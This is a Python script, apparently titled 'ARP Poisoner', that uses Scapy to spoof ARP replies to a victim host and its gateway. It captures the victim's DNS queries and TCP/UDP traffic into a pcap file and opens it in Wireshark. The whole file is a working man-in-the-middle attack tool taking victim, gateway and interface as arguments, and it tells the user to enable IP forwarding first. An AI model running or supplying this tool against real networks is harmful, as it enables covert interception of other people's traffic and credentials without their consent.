from multiprocessing import Process
from scapy.all import (Ether, ARP, IP, DNS, DNSQR, TCP, UDP, ICMP, sniff, srp, send, wrpcap, wireshark)

import sys
import time


def get_mac(targetip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


def Network_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        dns_query = packet.getlayer(DNSQR).qname.decode()
        print(
            f'\033[42mDNS\033[0m \033[32m[*] DNS src: {packet[IP].src} ==> DNS dst: {packet[IP].dst} \n        DNS query: {dns_query}\033[0m \n')

    if packet.haslayer(TCP):
        print(
            f'\033[41mTCP\033[0m \033[31m[*] TCP sport: {packet[TCP].sport} ==> TCP dport: {packet[TCP].dport}\033[0m \n')

    if packet.haslayer(UDP):
        print(
            f'\033[44mUDP\033[0m \033[96m[*] UDP sport: {packet[UDP].sport} ==> UDP dport: {packet[UDP].dport}\033[0m \n')


class Arp_Attack():
    def __init__(self, victim, gateway, interface):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        self.iface = interface
        self.verb = 0
        print(f'Initialized Interface: {interface}')
        print(f'Gateway: {gateway} is at {self.gatewaymac}')
        print(f'Victim: {victim} is at {self.victimmac}')
        print("-" * 100)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f"IP src: {poison_victim.psrc}")
        print(f"IP dst: {poison_victim.pdst}")
        print(f"mac dst: {poison_victim.hwdst}")
        print(f"mac src: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print("-" * 100)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f"IP src: {poison_gateway.psrc}")
        print(f"IP dst: {poison_gateway.pdst}")
        print(f"mac dst: {poison_gateway.hwdst}")
        print(f"mac src: {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print("-" * 100)
        print(f'Beginning ARP poisoning. [CTRL + C to stop]')
        print(
            '\033[31mWarning: Best if you do this command echo 1 > /proc/sys/net/ipv4/ip_forward before starting\033[0m')
        print("\033[31mDon't freak out for the Multi-Processing exit message. Just normal stuff\033[0m")

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()

            try:
                send(poison_victim)
                send(poison_gateway)

            except KeyboardInterrupt:
                print("Restoring the table")
                print("Don't freak out for the Multi-Processing exit message. Just normal stuff")
                self.restore()
                sys.exit(0)

            else:
                time.sleep(5)

    def sniff(self, count=100000):
        time.sleep(5)
        print(f'\n\033[33mSniffing the victims packets\033[0m \n')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, prn=Network_packet, iface=self.interface)
        wrpcap(f'pcap_of_{victim}.pcap', packets)
        print("\n That is enough packets for you!!")
        print("Got the packets")
        print("Opening wireshark to view the packets")
        wireshark(packets)
        self.restore()
        self.poison_thread.terminate()
        print("Finished")

    def restore(self):
        print("Restoring the table")
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst="ff:ff:ff:ff:ff:ff"),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gatewaymac,
            hwdst="ff:ff:ff:ff:ff:ff"),
            count=5)


if __name__ == '__main__':
    print("-" * 100)
    print("""\033[35m
     **     *******   *******                                       
    ****   /**////** /**////**                                      
   **//**  /**   /** /**   /**                                      
  **  //** /*******  /*******                                       
 **********/**///**  /**////                                        
/**//////**/**  //** /**                                            
/**     /**/**   //**/**                                            
//      // //     // //          

       *******           **                                         
      /**////**          //                                          
      /**   /**  ******  **  ******  ******  *******   *****  ******
      /*******  **////**/** **////  **////**//**///** **///**//**//*
      /**////  /**   /**/**//***** /**   /** /**  /**/******* /** / 
      /**      /**   /**/** /////**/**   /** /**  /**/**////  /**   
      /**      //****** /** ****** //******  ***  /**//******/***   
      //        //////  // //////   //////  ///   //  ////// ///                                                           
    \033[0m""")
    print("-" * 100)
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    arp = Arp_Attack(victim, gateway, interface)
    arp.run()